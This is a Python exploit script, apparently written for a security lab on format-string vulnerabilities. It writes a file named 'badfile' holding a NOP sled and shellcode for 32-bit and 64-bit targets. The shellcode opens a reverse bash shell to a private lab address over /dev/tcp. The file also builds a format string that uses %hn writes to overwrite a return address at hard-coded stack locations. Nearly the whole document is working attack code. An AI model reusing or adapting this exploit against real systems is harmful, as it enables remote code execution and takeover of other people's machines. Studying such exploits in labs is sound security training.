#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.0.2.4/9090 0<&1 2>&1           *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# 64-bit Generic Shellcode 
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.0.2.3/9090 0<&1 2>&1           *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_32

# Put the shellcode somewhere in the payload
start = 1500 -len(shellcode)               # Change this number
content[start:start + len(shellcode)] = shellcode

# ebp of myprintf 0xffffd3d8
# return address is therefore 0xFFFFD3DC
# We will change this adress to point to our code in the buffer
# where input buffer's address is 0xffffd4b0. Lets choose +200 to position our shellcode no-ops = 0xFFFFD6B0

# We know it takes 63 %.x to get from the print statement to our buffer

addr2 = 0xFFFFD3DC 
addr1 = 0xFFFFD3DE # changing 2 bytes at a time
content[0:4]  =  (addr2).to_bytes(4,byteorder='little')
content[4:8] = ("@@@@").encode('latin-1')
content[8:12]  =  (addr1).to_bytes(4,byteorder='little')

C = 62
D1 = 0xD6B0 - 12 - 8*C
D2 = 0xFFFF - 0xD6B0
s = "%.8x"*C + "%." + str(D1) + "x" + "%hn" \
             + "%." + str(D2) + "x" + "%hn" + "\n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
print(len(fmt))
content[12:12+len(fmt)] = fmt



# Save the format string to file
with open('badfile', 'wb') as f:
  f.write(content)
